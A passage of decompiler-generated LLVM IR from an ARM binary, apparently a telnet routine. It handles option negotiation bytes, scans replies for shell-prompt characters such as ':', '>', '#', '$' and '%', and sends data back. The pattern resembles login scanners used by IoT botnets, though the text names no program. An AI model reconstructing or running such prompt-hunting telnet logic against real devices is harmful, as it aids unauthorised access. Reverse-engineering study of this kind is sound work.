dec_label_pc_117e0:                               ; preds = %dec_label_pc_117c8
  %v2_117e0 = icmp ugt i8 %v2_117c8, -4
  store i1 %v2_117e0, i1* %cpsr_c.global-to-local, align 1
  %v7_117e0 = icmp eq i8 %v2_117c8, -3
  store i1 %v7_117e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_117e0, label %dec_label_pc_11f74, label %dec_label_pc_117e8

dec_label_pc_117e8:                               ; preds = %dec_label_pc_117e0
  %v1_117e8 = add i32 %v1_117d0, 2
  store i32 %v1_117e8, i32* %r3.global-to-local, align 4
  %v3_117ec = icmp uge i32 %v2_117bc, %v1_117e8
  store i1 %v3_117ec, i1* %cpsr_c.global-to-local, align 1
  %v9_117ec = icmp eq i32 %v2_117bc, %v1_117e8
  store i1 %v9_117ec, i1* %cpsr_z.global-to-local, align 1
  %v2_117f0 = xor i1 %v3_117ec, true
  %v3_117f0 = or i1 %v9_117ec, %v2_117f0
  br i1 %v3_117f0, label %dec_label_pc_11850, label %dec_label_pc_117f4

dec_label_pc_117f4:                               ; preds = %bb342, %dec_label_pc_11fc8, %bb341, %dec_label_pc_117e8
  %v0_117f4 = load i32, i32* @r4, align 4
  %v1_117f4 = inttoptr i32 %v0_117f4 to i8*
  %v2_117f4 = load i8, i8* %v1_117f4, align 1
  %v3_117f4 = zext i8 %v2_117f4 to i32
  store i32 %v3_117f4, i32* %r3.global-to-local, align 4
  %v2_117f8 = icmp ugt i8 %v2_117f4, -4
  store i1 %v2_117f8, i1* %cpsr_c.global-to-local, align 1
  %v7_117f8 = icmp eq i8 %v2_117f4, -3
  store i1 %v7_117f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_117f8, label %bb313, label %dec_label_pc_11804

bb313:                                            ; preds = %dec_label_pc_117f4
  %v1_117fc = load i32, i32* @r8, align 4
  %v2_117fc = trunc i32 %v1_117fc to i8
  store i8 %v2_117fc, i8* %v1_117f4, align 1
  %v0_11800.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11800.pr, label %bb315, label %.dec_label_pc_11804_crit_edge

.dec_label_pc_11804_crit_edge:                    ; preds = %bb313
  %v0_11804.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11804

dec_label_pc_11804:                               ; preds = %.dec_label_pc_11804_crit_edge, %dec_label_pc_117f4
  %v0_11804 = phi i32 [ %v0_11804.pre, %.dec_label_pc_11804_crit_edge ], [ %v3_117f4, %dec_label_pc_117f4 ]
  %v2_11804 = icmp ugt i32 %v0_11804, 250
  store i1 %v2_11804, i1* %cpsr_c.global-to-local, align 1
  %v7_11804 = icmp eq i32 %v0_11804, 251
  store i1 %v7_11804, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11804, label %bb314, label %bb315

bb314:                                            ; preds = %dec_label_pc_11804
  %v1_11808 = load i32, i32* %sl.global-to-local, align 4
  %v2_11808 = trunc i32 %v1_11808 to i8
  %v3_11808 = load i32, i32* @r4, align 4
  %v4_11808 = inttoptr i32 %v3_11808 to i8*
  store i8 %v2_11808, i8* %v4_11808, align 1
  br label %bb315

bb315:                                            ; preds = %bb313, %dec_label_pc_11804, %bb314
  %v0_1180c = load i32, i32* @r4, align 4
  %v1_1180c = add i32 %v0_1180c, 1
  %v2_1180c = inttoptr i32 %v1_1180c to i8*
  %v3_1180c = load i8, i8* %v2_1180c, align 1
  %v4_1180c = zext i8 %v3_1180c to i32
  store i32 %v4_1180c, i32* %r3.global-to-local, align 4
  %v2_11810 = icmp ugt i8 %v3_1180c, -4
  store i1 %v2_11810, i1* %cpsr_c.global-to-local, align 1
  %v7_11810 = icmp eq i8 %v3_1180c, -3
  store i1 %v7_11810, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11810, label %bb316, label %dec_label_pc_1181c

bb316:                                            ; preds = %bb315
  %v1_11814 = load i32, i32* @r8, align 4
  %v2_11814 = trunc i32 %v1_11814 to i8
  store i8 %v2_11814, i8* %v2_1180c, align 1
  %v0_11818.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11818.pr, label %bb318, label %.dec_label_pc_1181c_crit_edge

.dec_label_pc_1181c_crit_edge:                    ; preds = %bb316
  %v0_1181c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1181c

dec_label_pc_1181c:                               ; preds = %.dec_label_pc_1181c_crit_edge, %bb315
  %v0_1181c = phi i32 [ %v0_1181c.pre, %.dec_label_pc_1181c_crit_edge ], [ %v4_1180c, %bb315 ]
  %v2_1181c = icmp ugt i32 %v0_1181c, 250
  store i1 %v2_1181c, i1* %cpsr_c.global-to-local, align 1
  %v7_1181c = icmp eq i32 %v0_1181c, 251
  store i1 %v7_1181c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1181c, label %bb317, label %bb318

bb317:                                            ; preds = %dec_label_pc_1181c
  %v1_11820 = load i32, i32* %sl.global-to-local, align 4
  %v2_11820 = trunc i32 %v1_11820 to i8
  %v3_11820 = load i32, i32* @r4, align 4
  %v4_11820 = add i32 %v3_11820, 1
  %v5_11820 = inttoptr i32 %v4_11820 to i8*
  store i8 %v2_11820, i8* %v5_11820, align 1
  br label %bb318

bb318:                                            ; preds = %bb316, %dec_label_pc_1181c, %bb317
  %v0_11824 = load i32, i32* @r5, align 4
  %v1_11824 = add i32 %v0_11824, 4
  %v2_11824 = inttoptr i32 %v1_11824 to i32*
  %v3_11824 = load i32, i32* %v2_11824, align 4
  store i32 %v3_11824, i32* %r0.global-to-local, align 4
  %v0_11828 = load i32, i32* @r6, align 4
  br label %dec_label_pc_11830

dec_label_pc_11830:                               ; preds = %dec_label_pc_120a0, %bb318
  %v0_11834 = phi i32 [ %v3_120b8, %dec_label_pc_120a0 ], [ %v3_11824, %bb318 ]
  %storemerge5 = phi i32 [ %v2_11f8c, %dec_label_pc_120a0 ], [ %v0_11828, %bb318 ]
  %storemerge = phi i32 [ 9, %dec_label_pc_120a0 ], [ 3, %bb318 ]
  store i32 %storemerge5, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_11834 = inttoptr i32 %storemerge5 to i32*
  %v5_11834 = call i32 @function_13ec0(i32 %v0_11834, i32* %v4_11834, i32 %storemerge, i32 16384)
  store i32 %v5_11834, i32* %r0.global-to-local, align 4
  %v0_11838 = load i32, i32* @r5, align 4
  %v1_11838 = add i32 %v0_11838, 24
  %v2_11838 = inttoptr i32 %v1_11838 to i32*
  %v3_11838 = load i32, i32* %v2_11838, align 4
  store i32 %v3_11838, i32* %ip.global-to-local, align 4
  %v0_1183c = load i32, i32* @r7, align 4
  %v1_1183c = add i32 %v0_1183c, 3
  store i32 %v1_1183c, i32* @r7, align 4
  %v3_11840 = icmp uge i32 %v1_1183c, %v3_11838
  store i1 %v3_11840, i1* %cpsr_c.global-to-local, align 1
  %v9_11840 = icmp eq i32 %v1_1183c, %v3_11838
  store i1 %v9_11840, i1* %cpsr_z.global-to-local, align 1
  %v0_11844 = load i32, i32* @r6, align 4
  %v1_11844 = add i32 %v0_11844, 3
  store i32 %v1_11844, i32* @r6, align 4
  %v0_11848 = load i32, i32* @r4, align 4
  %v1_11848 = add i32 %v0_11848, 3
  store i32 %v1_11848, i32* @r4, align 4
  %v5_1184c = icmp slt i32 %v1_1183c, %v3_11838
  br i1 %v5_1184c, label %dec_label_pc_117b0, label %dec_label_pc_11850

dec_label_pc_11850:                               ; preds = %dec_label_pc_117a8.loopexit, %dec_label_pc_117b0, %dec_label_pc_11830, %dec_label_pc_117e8, %dec_label_pc_117bc, %dec_label_pc_11788, %dec_label_pc_11f74.dec_label_pc_11850.loopexit_crit_edge
  %v6_11858 = phi i32 [ %v0_11f98, %dec_label_pc_11f74.dec_label_pc_11850.loopexit_crit_edge ], [ %v0_11750, %dec_label_pc_11788 ], [ %v6_11858169, %dec_label_pc_117b0 ], [ %v0_11838, %dec_label_pc_11830 ], [ %v6_11858169, %dec_label_pc_117e8 ], [ %v6_11858169, %dec_label_pc_117bc ], [ %v6_11858169, %dec_label_pc_117a8.loopexit ]
  %v0_11860.pre = phi i32 [ %v0_11850.pre.pre, %dec_label_pc_11f74.dec_label_pc_11850.loopexit_crit_edge ], [ 0, %dec_label_pc_11788 ], [ %v1_117d8, %dec_label_pc_117b0 ], [ %v1_1183c, %dec_label_pc_11830 ], [ %v1_117d8, %dec_label_pc_117e8 ], [ %v1_117d8, %dec_label_pc_117bc ], [ %v2_117d8, %dec_label_pc_117a8.loopexit ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11850 = icmp eq i32 %v0_11860.pre, 0
  store i1 %v2_11850, i1* %cpsr_z.global-to-local, align 1
  %tmp319 = icmp slt i32 %v0_11860.pre, 1
  br i1 %tmp319, label %dec_label_pc_11860, label %.thread204

.thread204:                                       ; preds = %dec_label_pc_11850
  store i32 3, i32* %r2.global-to-local, align 4
  %v7_11858 = add i32 %v6_11858, 12
  %v8_11858 = inttoptr i32 %v7_11858 to i32*
  store i32 3, i32* %v8_11858, align 4
  br label %dec_label_pc_11e9c

dec_label_pc_11860:                               ; preds = %dec_label_pc_11850, %dec_label_pc_11f14, %dec_label_pc_11dec, %dec_label_pc_11d08, %dec_label_pc_11c54, %dec_label_pc_11ba0, %dec_label_pc_11aec, %dec_label_pc_11a54, %dec_label_pc_118c4
  %v0_11860 = phi i32 [ %v1_11f08, %dec_label_pc_11f14 ], [ %v0_11de4, %dec_label_pc_11dec ], [ %v1_11cfc, %dec_label_pc_11d08 ], [ %v1_11c48, %dec_label_pc_11c54 ], [ %v1_11b94, %dec_label_pc_11ba0 ], [ %v1_11ae0, %dec_label_pc_11aec ], [ %v0_11a54, %dec_label_pc_11a54 ], [ %v0_118c4, %dec_label_pc_118c4 ], [ %v0_11860.pre, %dec_label_pc_11850 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11860 = icmp eq i32 %v0_11860, 0
  store i1 %v2_11860, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11860, label %dec_label_pc_116cc.loopexit, label %dec_label_pc_11868

dec_label_pc_11868:                               ; preds = %dec_label_pc_11860
  %v0_11868 = load i32, i32* @r5, align 4
  %v1_11868 = add i32 %v0_11868, 24
  %v2_11868 = inttoptr i32 %v1_11868 to i32*
  %v3_11868 = load i32, i32* %v2_11868, align 4
  store i32 %v3_11868, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11e9c

dec_label_pc_11870:                               ; preds = %dec_label_pc_11750
  %v1_11870 = add i32 %v0_11750, 24
  %v2_11870 = inttoptr i32 %v1_11870 to i32*
  %v3_11870 = load i32, i32* %v2_11870, align 4
  store i32 %v3_11870, i32* %ip.global-to-local, align 4
  %v1_11874 = add i32 %v3_11870, -1
  store i32 %v1_11874, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11878 = icmp eq i32 %v1_11874, 0
  store i1 %v2_11878, i1* %cpsr_z.global-to-local, align 1
  %v5_1187c = icmp sgt i32 %v1_11874, 0
  br i1 %v5_1187c, label %dec_label_pc_118a4, label %dec_label_pc_1168c

dec_label_pc_11884:                               ; preds = %bb320
  %v2_11884 = icmp ugt i8 %v3_118a8, 35
  store i1 %v2_11884, i1* %cpsr_c.global-to-local, align 1
  %v7_11884 = icmp eq i8 %v3_118a8, 36
  store i1 %v7_11884, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11884, label %dec_label_pc_118b8, label %dec_label_pc_1188c

dec_label_pc_1188c:                               ; preds = %dec_label_pc_11884
  %v2_1188c = icmp ugt i8 %v3_118a8, 34
  store i1 %v2_1188c, i1* %cpsr_c.global-to-local, align 1
  %v7_1188c = icmp eq i8 %v3_118a8, 35
  store i1 %v7_1188c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1188c, label %dec_label_pc_118b8, label %dec_label_pc_11894

dec_label_pc_11894:                               ; preds = %dec_label_pc_1188c
  %v2_11894 = icmp ugt i8 %v3_118a8, 36
  store i1 %v2_11894, i1* %cpsr_c.global-to-local, align 1
  %v7_11894 = icmp eq i8 %v3_118a8, 37
  store i1 %v7_11894, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11894, label %dec_label_pc_118b8, label %dec_label_pc_1189c

dec_label_pc_1189c:                               ; preds = %dec_label_pc_11894
  %v1_1189c = add i32 %v0_118b8, -1
  store i32 %v1_1189c, i32* %r0.global-to-local, align 4
  %v2_1189c = icmp ne i32 %v0_118b8, 0
  store i1 %v2_1189c, i1* %cpsr_c.global-to-local, align 1
  %v7_1189c = icmp eq i32 %v0_118b8, 1
  store i1 %v7_1189c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1189c, label %dec_label_pc_1168c, label %dec_label_pc_118a4

dec_label_pc_118a4:                               ; preds = %dec_label_pc_11870, %dec_label_pc_1189c
  %v0_118b8 = phi i32 [ %v1_1189c, %dec_label_pc_1189c ], [ %v1_11874, %dec_label_pc_11870 ]
  %v2_118a4 = add i32 %v0_118b8, %v0_11750
  store i32 %v2_118a4, i32* %r3.global-to-local, align 4
  %v1_118a8 = add i32 %v2_118a4, 28
  %v2_118a8 = inttoptr i32 %v1_118a8 to i8*
  %v3_118a8 = load i8, i8* %v2_118a8, align 1
  %v4_118a8 = zext i8 %v3_118a8 to i32
  store i32 %v4_118a8, i32* %r3.global-to-local, align 4
  %v2_118ac = icmp ugt i8 %v3_118a8, 61
  store i1 %v2_118ac, i1* %cpsr_c.global-to-local, align 1
  %v7_118ac = icmp eq i8 %v3_118a8, 62
  store i1 %v7_118ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_118ac, label %dec_label_pc_118b8, label %bb320

bb320:                                            ; preds = %dec_label_pc_118a4
  %v3_118b0 = icmp ugt i8 %v3_118a8, 57
  store i1 %v3_118b0, i1* %cpsr_c.global-to-local, align 1
  %v8_118b0 = icmp eq i8 %v3_118a8, 58
  store i1 %v8_118b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_118b0, label %dec_label_pc_118b8, label %dec_label_pc_11884

dec_label_pc_118b8:                               ; preds = %dec_label_pc_118a4, %bb320, %dec_label_pc_11894, %dec_label_pc_1188c, %dec_label_pc_11884
  %v1_118b8 = add i32 %v0_118b8, 1
  store i32 %v1_118b8, i32* @r7, align 4
  %v2_118bc = icmp eq i32 %v1_118b8, -1
  store i1 %v2_118bc, i1* %cpsr_c.global-to-local, align 1
  %v7_118bc = icmp eq i32 %v0_118b8, -2
  store i1 %v7_118bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_118bc, label %dec_label_pc_1168c, label %dec_label_pc_118c4

dec_label_pc_118c4:                               ; preds = %dec_label_pc_118b8, %dec_label_pc_116ac, %dec_label_pc_1168c
  %v0_118c4 = phi i32 [ %v5_116bc, %dec_label_pc_116ac ], [ %v5_1169c, %dec_label_pc_1168c ], [ %v1_118b8, %dec_label_pc_118b8 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_118c4 = icmp eq i32 %v0_118c4, 0
  store i1 %v2_118c4, i1* %cpsr_z.global-to-local, align 1
  %tmp321 = icmp slt i32 %v0_118c4, 1
  br i1 %tmp321, label %dec_label_pc_11860, label %dec_label_pc_118cc

dec_label_pc_118cc:                               ; preds = %dec_label_pc_118c4
  %v0_118cc = load i32, i32* @r5, align 4
  %v1_118cc = inttoptr i32 %v0_118cc to i32*
  %v2_118cc = load i32, i32* %v1_118cc, align 4
  store i32 %v2_118cc, i32* %r3.global-to-local, align 4
  %v1_118d0 = add i32 %v0_118cc, 4
  %v2_118d0 = inttoptr i32 %v1_118d0 to i32*
  %v3_118d0 = load i32, i32* %v2_118d0, align 4
  store i32 %v3_118d0, i32* %r0.global-to-local, align 4
  %v1_118d4 = add i32 %v2_118cc, 12
  %v2_118d4 = inttoptr i32 %v1_118d4 to i8*
  %v3_118d4 = load i8, i8* %v2_118d4, align 1
  %v4_118d4 = zext i8 %v3_118d4 to i32
  store i32 %v4_118d4, i32* %r2.global-to-local, align 4
  %v1_118d8 = inttoptr i32 %v2_118cc to i32*
  %v2_118d8 = load i32, i32* %v1_118d8, align 4
  store i32 %v2_118d8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_118e0 = inttoptr i32 %v2_118d8 to i32*
  %v5_118e0 = call i32 @function_13ec0(i32 %v3_118d0, i32* %v4_118e0, i32 %v4_118d4, i32 16384)
  store i32 %v5_118e0, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_118e8 = load i32, i32* @r5, align 4
  %v1_118e8 = add i32 %v0_118e8, 4
  %v2_118e8 = inttoptr i32 %v1_118e8 to i32*
  %v3_118e8 = load i32, i32* %v2_118e8, align 4
  store i32 %v3_118e8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_118f4 = call i32 @function_13ec0(i32 %v3_118e8, i32* bitcast ([3 x i8]* @global_var_15f10.34 to i32*), i32 2, i32 16384)
  store i32 %v5_118f4, i32* %r0.global-to-local, align 4
  %v0_118f8 = load i32, i32* @r5, align 4
  %v1_118f8 = add i32 %v0_118f8, 24
  %v2_118f8 = inttoptr i32 %v1_118f8 to i32*
  %v3_118f8 = load i32, i32* %v2_118f8, align 4
  store i32 %v3_118f8, i32* %ip.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v2_11900 = add i32 %v0_118f8, 12
  %v3_11900 = inttoptr i32 %v2_11900 to i32*
  store i32 4, i32* %v3_11900, align 4
  br label %dec_label_pc_11e9c

dec_label_pc_11a08:                               ; preds = %dec_label_pc_11750
  %v1_11a08 = add i32 %v0_11750, 24
  %v2_11a08 = inttoptr i32 %v1_11a08 to i32*
  %v3_11a08 = load i32, i32* %v2_11a08, align 4
  store i32 %v3_11a08, i32* %ip.global-to-local, align 4
  %v1_11a0c = add i32 %v3_11a08, -1
  store i32 %v1_11a0c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11a10 = icmp eq i32 %v1_11a0c, 0
  store i1 %v2_11a10, i1* %cpsr_z.global-to-local, align 1
  %v5_11a14 = icmp sgt i32 %v1_11a0c, 0
  br i1 %v5_11a14, label %dec_label_pc_11a34, label %dec_label_pc_1207c

dec_label_pc_11a1c:                               ; preds = %bb322
  %v2_11a1c = icmp ugt i8 %v3_11a38, 35
  store i1 %v2_11a1c, i1* %cpsr_c.global-to-local, align 1
  %v7_11a1c = icmp eq i8 %v3_11a38, 36
  store i1 %v7_11a1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11a1c, label %dec_label_pc_11a48, label %dec_label_pc_11a24

dec_label_pc_11a24:                               ; preds = %dec_label_pc_11a1c
  %v2_11a24 = icmp ugt i8 %v3_11a38, 34
  store i1 %v2_11a24, i1* %cpsr_c.global-to-local, align 1
  %v7_11a24 = icmp eq i8 %v3_11a38, 35
  store i1 %v7_11a24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11a24, label %dec_label_pc_11a48, label %dec_label_pc_11a2c

dec_label_pc_11a2c:                               ; preds = %dec_label_pc_11a24
  %v1_11a2c = add i32 %v0_11a48, -1
  store i32 %v1_11a2c, i32* %r0.global-to-local, align 4
  %v2_11a2c = icmp ne i32 %v0_11a48, 0
  store i1 %v2_11a2c, i1* %cpsr_c.global-to-local, align 1
  %v7_11a2c = icmp eq i32 %v0_11a48, 1
  store i1 %v7_11a2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11a2c, label %dec_label_pc_1207c, label %dec_label_pc_11a34

dec_label_pc_11a34:                               ; preds = %dec_label_pc_11a08, %dec_label_pc_11a2c
  %v0_11a48 = phi i32 [ %v1_11a2c, %dec_label_pc_11a2c ], [ %v1_11a0c, %dec_label_pc_11a08 ]
  %v2_11a34 = add i32 %v0_11a48, %v0_11750
  store i32 %v2_11a34, i32* %r3.global-to-local, align 4
  %v1_11a38 = add i32 %v2_11a34, 28
  %v2_11a38 = inttoptr i32 %v1_11a38 to i8*
  %v3_11a38 = load i8, i8* %v2_11a38, align 1
  %v4_11a38 = zext i8 %v3_11a38 to i32
  store i32 %v4_11a38, i32* %r3.global-to-local, align 4
  %v2_11a3c = icmp ugt i8 %v3_11a38, 61
  store i1 %v2_11a3c, i1* %cpsr_c.global-to-local, align 1
  %v7_11a3c = icmp eq i8 %v3_11a38, 62
  store i1 %v7_11a3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11a3c, label %dec_label_pc_11a48, label %bb322

bb322:                                            ; preds = %dec_label_pc_11a34
  %v3_11a40 = icmp ugt i8 %v3_11a38, 57
  store i1 %v3_11a40, i1* %cpsr_c.global-to-local, align 1
  %v8_11a40 = icmp eq i8 %v3_11a38, 58
  store i1 %v8_11a40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11a40, label %dec_label_pc_11a48, label %dec_label_pc_11a1c

dec_label_pc_11a48:                               ; preds = %dec_label_pc_11a34, %bb322, %dec_label_pc_11a24, %dec_label_pc_11a1c
  %v1_11a48 = add i32 %v0_11a48, 1
  store i32 %v1_11a48, i32* @r7, align 4
  %v2_11a4c = icmp eq i32 %v1_11a48, -1
  store i1 %v2_11a4c, i1* %cpsr_c.global-to-local, align 1
  %v7_11a4c = icmp eq i32 %v0_11a48, -2
  store i1 %v7_11a4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11a4c, label %dec_label_pc_1207c, label %dec_label_pc_11a54

dec_label_pc_11a54:                               ; preds = %dec_label_pc_11a48, %dec_label_pc_1207c
  %v0_11a54 = phi i32 [ %v5_1208c, %dec_label_pc_1207c ], [ %v1_11a48, %dec_label_pc_11a48 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11a54 = icmp eq i32 %v0_11a54, 0
  store i1 %v2_11a54, i1* %cpsr_z.global-to-local, align 1
  %tmp323 = icmp slt i32 %v0_11a54, 1
  br i1 %tmp323, label %dec_label_pc_11860, label %dec_label_pc_11a5c

dec_label_pc_11a5c:                               ; preds = %dec_label_pc_11a54
  %v0_11a5c = load i32, i32* @r5, align 4
  %v1_11a5c = inttoptr i32 %v0_11a5c to i32*
  %v2_11a5c = load i32, i32* %v1_11a5c, align 4
  store i32 %v2_11a5c, i32* %r3.global-to-local, align 4
  %v1_11a60 = add i32 %v0_11a5c, 4
  %v2_11a60 = inttoptr i32 %v1_11a60 to i32*
  %v3_11a60 = load i32, i32* %v2_11a60, align 4
  store i32 %v3_11a60, i32* %r0.global-to-local, align 4
  %v1_11a64 = add i32 %v2_11a5c, 13
  %v2_11a64 = inttoptr i32 %v1_11a64 to i8*
  %v3_11a64 = load i8, i8* %v2_11a64, align 1
  %v4_11a64 = zext i8 %v3_11a64 to i32
  store i32 %v4_11a64, i32* %r2.global-to-local, align 4
  %v1_11a68 = add i32 %v2_11a5c, 4
  %v2_11a68 = inttoptr i32 %v1_11a68 to i32*
  %v3_11a68 = load i32, i32* %v2_11a68, align 4
  store i32 %v3_11a68, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_11a70 = inttoptr i32 %v3_11a68 to i32*
  %v5_11a70 = call i32 @function_13ec0(i32 %v3_11a60, i32* %v4_11a70, i32 %v4_11a64, i32 16384)
  store i32 %v5_11a70, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_11a78 = load i32, i32* @r5, align 4
  %v1_11a78 = add i32 %v0_11a78, 4
  %v2_11a78 = inttoptr i32 %v1_11a78 to i32*
  %v3_11a78 = load i32, i32* %v2_11a78, align 4
  store i32 %v3_11a78, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_11a84 = call i32 @function_13ec0(i32 %v3_11a78, i32* bitcast ([3 x i8]* @global_var_15f10.34 to i32*), i32 2, i32 16384)
  store i32 %v5_11a84, i32* %r0.global-to-local, align 4
  %v0_11a88 = load i32, i32* @r5, align 4
  %v1_11a88 = add i32 %v0_11a88, 24
  %v2_11a88 = inttoptr i32 %v1_11a88 to i32*
  %v3_11a88 = load i32, i32* %v2_11a88, align 4
  store i32 %v3_11a88, i32* %ip.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_11a90 = add i32 %v0_11a88, 12
  %v3_11a90 = inttoptr i32 %v2_11a90 to i32*
  store i32 5, i32* %v3_11a90, align 4
  br label %dec_label_pc_11e9c

dec_label_pc_11a98:                               ; preds = %dec_label_pc_11750
  %v1_11a98 = add i32 %v0_11750, 24
  %v2_11a98 = inttoptr i32 %v1_11a98 to i32*
  %v3_11a98 = load i32, i32* %v2_11a98, align 4
  store i32 %v3_11a98, i32* %ip.global-to-local, align 4
  %v1_11a9c = add i32 %v3_11a98, -1
  store i32 %v1_11a9c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11aa0 = icmp eq i32 %v1_11a9c, 0
  store i1 %v2_11aa0, i1* %cpsr_z.global-to-local, align 1
  %v5_11aa4 = icmp sgt i32 %v1_11a9c, 0
  br i1 %v5_11aa4, label %dec_label_pc_11acc, label %dec_label_pc_116d0thread-pre-split.thread

dec_label_pc_11aac:                               ; preds = %bb324
  %v2_11aac = icmp ugt i8 %v3_11ad0, 35
  store i1 %v2_11aac, i1* %cpsr_c.global-to-local, align 1
  %v7_11aac = icmp eq i8 %v3_11ad0, 36
  store i1 %v7_11aac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11aac, label %dec_label_pc_11ae0, label %dec_label_pc_11ab4

dec_label_pc_11ab4:                               ; preds = %dec_label_pc_11aac
  %v2_11ab4 = icmp ugt i8 %v3_11ad0, 34
  store i1 %v2_11ab4, i1* %cpsr_c.global-to-local, align 1
  %v7_11ab4 = icmp eq i8 %v3_11ad0, 35
  store i1 %v7_11ab4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11ab4, label %dec_label_pc_11ae0, label %dec_label_pc_11abc

dec_label_pc_11abc:                               ; preds = %dec_label_pc_11ab4
  %v2_11abc = icmp ugt i8 %v3_11ad0, 36
  store i1 %v2_11abc, i1* %cpsr_c.global-to-local, align 1
  %v7_11abc = icmp eq i8 %v3_11ad0, 37
  store i1 %v7_11abc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11abc, label %dec_label_pc_11ae0, label %dec_label_pc_11ac4

dec_label_pc_11ac4:                               ; preds = %dec_label_pc_11abc
  %v1_11ac4 = add i32 %v0_11ae0, -1
  store i32 %v1_11ac4, i32* %r0.global-to-local, align 4
  %v2_11ac4 = icmp ne i32 %v0_11ae0, 0
  store i1 %v2_11ac4, i1* %cpsr_c.global-to-local, align 1
  %v7_11ac4 = icmp eq i32 %v0_11ae0, 1
  store i1 %v7_11ac4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11ac4, label %dec_label_pc_116d0thread-pre-split, label %dec_label_pc_11acc

dec_label_pc_11acc:                               ; preds = %dec_label_pc_11a98, %dec_label_pc_11ac4
  %v0_11ae0 = phi i32 [ %v1_11ac4, %dec_label_pc_11ac4 ], [ %v1_11a9c, %dec_label_pc_11a98 ]
  %v2_11acc = add i32 %v0_11ae0, %v0_11750
  store i32 %v2_11acc, i32* %r3.global-to-local, align 4
  %v1_11ad0 = add i32 %v2_11acc, 28
  %v2_11ad0 = inttoptr i32 %v1_11ad0 to i8*
  %v3_11ad0 = load i8, i8* %v2_11ad0, align 1
  %v4_11ad0 = zext i8 %v3_11ad0 to i32
  store i32 %v4_11ad0, i32* %r3.global-to-local, align 4
  %v2_11ad4 = icmp ugt i8 %v3_11ad0, 61
  store i1 %v2_11ad4, i1* %cpsr_c.global-to-local, align 1
  %v7_11ad4 = icmp eq i8 %v3_11ad0, 62
  store i1 %v7_11ad4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11ad4, label %dec_label_pc_11ae0, label %bb324

bb324:                                            ; preds = %dec_label_pc_11acc
  %v3_11ad8 = icmp ugt i8 %v3_11ad0, 57
  store i1 %v3_11ad8, i1* %cpsr_c.global-to-local, align 1
  %v8_11ad8 = icmp eq i8 %v3_11ad0, 58
  store i1 %v8_11ad8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11ad8, label %dec_label_pc_11ae0, label %dec_label_pc_11aac

dec_label_pc_11ae0:                               ; preds = %dec_label_pc_11acc, %bb324, %dec_label_pc_11abc, %dec_label_pc_11ab4, %dec_label_pc_11aac
  %v1_11ae0 = add i32 %v0_11ae0, 1
  store i32 %v1_11ae0, i32* @r7, align 4
  %v2_11ae4 = icmp eq i32 %v1_11ae0, -1
  store i1 %v2_11ae4, i1* %cpsr_c.global-to-local, align 1
  %v7_11ae4 = icmp eq i32 %v0_11ae0, -2
  store i1 %v7_11ae4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11ae4, label %dec_label_pc_116d0thread-pre-split, label %dec_label_pc_11aec

dec_label_pc_11aec:                               ; preds = %dec_label_pc_11ae0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11aec = icmp eq i32 %v1_11ae0, 0
  store i1 %v2_11aec, i1* %cpsr_z.global-to-local, align 1
  %tmp325 = icmp slt i32 %v1_11ae0, 1
  br i1 %tmp325, label %dec_label_pc_11860, label %dec_label_pc_11af4

dec_label_pc_11af4:                               ; preds = %dec_label_pc_11aec
  store i32 21, i32* %r0.global-to-local, align 4
